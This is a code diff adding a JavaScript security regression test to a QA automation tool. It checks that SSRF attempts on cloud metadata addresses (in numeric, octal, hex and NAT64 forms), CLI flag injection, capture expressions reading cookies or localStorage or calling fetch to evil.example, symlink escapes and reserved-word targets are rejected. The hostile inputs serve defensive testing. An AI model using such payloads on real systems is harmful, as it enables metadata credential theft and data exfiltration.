@@ -4534,5 +4534,190 @@ test('39. Unified agentic-solid-qe Single Entry Point: gatePayload/GATE_OPTIONS,
   }
 });
 
+test('40. Deep Vulnerability Audit Remediation: unified SSRF/NAT64/numeric-IP protection, explore flag/capture-eval guards, symlink confinement & $-replacement hardening', async () => {
+  const {
+    assertSafeExploreUrl,
+    validateExploreActionTuple,
+    validateSafeCaptureRequest,
+  } = await import('./explore-session.mjs');
+  const {
+    assertSafeTargetHttpUrl,
+    isForbiddenIpAddress,
+  } = await import('./report-cloud.mjs');
+  const { isValidHttpUrl, validateTapeObject } = await import('./validate-tapes.mjs');
+  const { applyBuilderDataOverrides, cloneTape } = await import('./tape-cli.mjs');
+  const { analyzeAndHealDrift } = await import('./heal-drift.mjs');
+  const { discoverAndSeedLiveShards } = await import('./orchestrate.mjs');
+  const { compileSessionTape } = await import('./compile-tape.mjs');
+
+  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'asqe-vuln-audit-'));
+  const outsideFile = path.join(os.tmpdir(), `asqe-outside-vuln-${Date.now()}.json`);
+  fs.writeFileSync(outsideFile, '{"secret":"do-not-touch"}\n', 'utf8');
+
+  try {
+    // 1. Unified SSRF protection across explore-session, validate-tapes, report-cloud, and orchestrate --discover-shards
+    assert.equal(isForbiddenIpAddress('64:ff9b::169.254.169.254'), true, 'NAT64 dotted-quad metadata IP must be blocked');
+    assert.equal(isForbiddenIpAddress('64:ff9b::a9fe:a9fe'), true, 'NAT64 hex metadata IP must be blocked');
+    assert.throws(() => assertSafeExploreUrl('http://2852039166/latest/meta-data/'), /Non-canonical numeric/);
+    assert.throws(() => assertSafeExploreUrl('http://0xa9fea9fe/latest/meta-data/'), /Non-canonical numeric/);
+    assert.throws(() => assertSafeExploreUrl('http://0251.0376.0251.0376/'), /Non-canonical numeric/);
+    assert.throws(() => assertSafeExploreUrl('http://[64:ff9b::a9fe:a9fe]/'), /forbidden/);
+    assert.throws(() => assertSafeExploreUrl('http://10.0.0.1/admin', 'URL', {}), /forbidden/);
+    assert.throws(() => assertSafeExploreUrl('http://192.168.1.1/admin', 'URL', {}), /forbidden/);
+    assert.throws(() => assertSafeExploreUrl('http://172.16.0.1/admin', 'URL', {}), /forbidden/);
+    assert.throws(() => assertSafeExploreUrl('http://100.64.0.1/admin', 'URL', {}), /forbidden/);
+    // Localhost allowed by default, and RFC1918 allowed when CORTEX_ALLOW_PRIVATE_NET=1 or ALLOWED_TARGET_HOSTS matches
+    assert.equal(assertSafeExploreUrl('http://localhost:3000/login', 'URL', {}), 'http://localhost:3000/login');
+    assert.equal(assertSafeExploreUrl('http://127.0.0.1:8080/app', 'URL', {}), 'http://127.0.0.1:8080/app');
+    assert.equal(
+      assertSafeExploreUrl('http://10.0.0.15:8080/app', 'URL', { CORTEX_ALLOW_PRIVATE_NET: '1' }),
+      'http://10.0.0.15:8080/app'
+    );
+    assert.equal(
+      assertSafeTargetHttpUrl('https://192.168.1.50/portal', {
+        env: { ALLOWED_TARGET_HOSTS: '192.168.1.50' },
+      }),
+      'https://192.168.1.50/portal'
+    );
+    // Cloud metadata is NEVER allowed even when CORTEX_ALLOW_PRIVATE_NET=1
+    assert.throws(
+      () => assertSafeExploreUrl('http://169.254.169.254/latest/meta-data/', 'URL', { CORTEX_ALLOW_PRIVATE_NET: '1' }),
+      /forbidden/
+    );
+    assert.equal(isValidHttpUrl('http://10.0.0.1/api', {}), false);
+    assert.equal(isValidHttpUrl('http://[64:ff9b::a9fe:a9fe]/api', {}), false);
+    await assert.rejects(
+      () => discoverAndSeedLiveShards(tmpRoot, { baseUrl: 'http://169.254.169.254/latest/meta-data/' }),
+      /Security Error/
+    );
+
+    // 2. CLI Flag Injection on value & Capture --from eval Hardening
+    assert.throws(
+      () => validateExploreActionTuple(['fill', '@e2', '--cdp=9222']),
+      /Security Error: Action value '--cdp=9222' cannot begin with a CLI flag prefix/
+    );
+    assert.throws(
+      () => validateExploreActionTuple(['fill', '@e2', '-h']),
+      /Security Error: Action value '-h' cannot begin with a CLI flag prefix/
+    );
+    // Negative numbers remain permitted as input values
+    assert.equal(validateExploreActionTuple(['fill', '@e2', '-42.50']).interpolatedVal, '-42.50');
+
+    assert.throws(
+      () => validateSafeCaptureRequest({ varName: 'sessionSecret', from: 'url', expr: 'id=([^&]+)' }),
+      /Refusing to capture sensitive credential/
+    );
+    assert.throws(
+      () => validateSafeCaptureRequest({ varName: 'quoteId', from: 'eval', expr: 'document.cookie' }),
+      /Disallowed token in capture --expr/
+    );
+    assert.throws(
+      () => validateSafeCaptureRequest({ varName: 'quoteId', from: 'eval', expr: 'JSON.stringify(localStorage)' }),
+      /Disallowed token in capture --expr/
+    );
+    assert.throws(
+      () => validateSafeCaptureRequest({ varName: 'quoteId', from: 'eval', expr: "fetch('https://evil.example/x')" }),
+      /Disallowed token in capture --expr/
+    );
+    assert.equal(
+      validateSafeCaptureRequest({ varName: 'quoteId', from: 'eval', expr: '@e12' }).from,
+      'text',
+      '@eN shorthand in --from eval must auto-promote to safe text extraction'
+    );
+    assert.equal(
+      validateSafeCaptureRequest({
+        varName: 'quoteId',
+        from: 'eval',
+        expr: "document.querySelector('[data-testid=\"quote-id\"]')?.textContent?.trim()",
+      }).from,
+      'eval'
+    );
+
+    // 3. Symlink Escape Confinement in tape-cli.mjs and heal-drift.mjs
+    const tapesDir = path.join(tmpRoot, '.exploratory/tapes');
+    fs.mkdirSync(tapesDir, { recursive: true });
+    fs.symlinkSync(outsideFile, path.join(tapesDir, 'symlinked-tape.json'));
+    assert.throws(
+      () => cloneTape(tmpRoot, 'symlinked-tape', 'cloned-tape'),
+      /Security Error: Refusing symlinked path/
+    );
+
+    const defectsDir = path.join(tmpRoot, 'defects');
+    fs.symlinkSync(os.tmpdir(), defectsDir);
+    assert.throws(
+      () =>
+        analyzeAndHealDrift(tmpRoot, {
+          spec: 'tests/checkout.spec.ts',
+          error: 'HTTP 500 Internal Server Error',
+          httpStatuses: [500],
+          apply: true,
+        }),
+      /Security Error: Refusing symlinked path/
+    );
+    fs.unlinkSync(defectsDir);
+
+    // 4. tape-cli.mjs String.prototype.replace $-pattern immunity & compile-tape.mjs reserved-word expectedStates blocking
+    const dataDir = path.join(tmpRoot, 'src/data');
+    fs.mkdirSync(dataDir, { recursive: true });
+    fs.writeFileSync(
+      path.join(dataDir, 'price.builder.ts'),
+      `export class PriceBuilder {\n  static standard() {\n    return {\n      label: 'initial',\n    };\n  }\n}\n`,
+      'utf8'
+    );
+    applyBuilderDataOverrides(tmpRoot, [
+      { ref: 'PriceBuilder.nextMethod().amount', value: 'Total: $` $& $\' $$100' },
+    ]);
+    const updatedBuilder = fs.readFileSync(path.join(dataDir, 'price.builder.ts'), 'utf8');
+    assert.ok(
+      updatedBuilder.includes('"Total: $` $& $\' $$100"'),
+      'Replacement values containing $`, $&, $\' must not corrupt generated TypeScript'
+    );
+
+    const reservedWordTape = {
+      schemaVersion: '1.0.0',
+      scenarioId: 'reserved-target-check',
+      title: 'Reserved Target Check',
+      charter: 'happy-path-baseline',
+      recordedAt: '2026-11-21T00:00:00.000Z',
+      baseUrl: 'https://example.com',
+      persona: { role: 'standard', dataBuilderRef: 'PriceBuilder.standard()' },
+      preconditions: ['Ready'],
+      semanticSteps: [
+        {
+          stepIndex: 1,
+          intent: 'Open home',
+          action: 'goto',
+          componentCandidate: 'HomeComponent',
+          locatorContract: { strategy: 'url', value: '/' },
+        },
+      ],
+      networkContracts: [],
+      expectedStates: [
+        {
+          description: 'Check visibility',
+          assertionType: 'toBeVisible',
+          targetComponent: 'eval',
+          targetProperty: 'root',
+          expectedValueRef: 'PriceBuilder.standard().label',
+        },
+      ],
+    };
+    fs.writeFileSync(
+      path.join(tapesDir, 'reserved-target-check.json'),
+      JSON.stringify(reservedWordTape, null, 2),
+      'utf8'
+    );
+    assert.ok(validateTapeObject(reservedWordTape, 'reserved-target-check.json').length === 0);
+    assert.throws(
+      () => compileSessionTape({ tapeInput: 'reserved-target-check', rootDir: tmpRoot, apply: false }),
+      /Security Error: Unsafe or reserved JavaScript expectedStates\.targetComponent segment 'eval'/
+    );
+  } finally {
+    fs.rmSync(tmpRoot, { recursive: true, force: true });
+    if (fs.existsSync(outsideFile)) fs.rmSync(outsideFile, { force: true });
+  }
+});
+
+
 
 
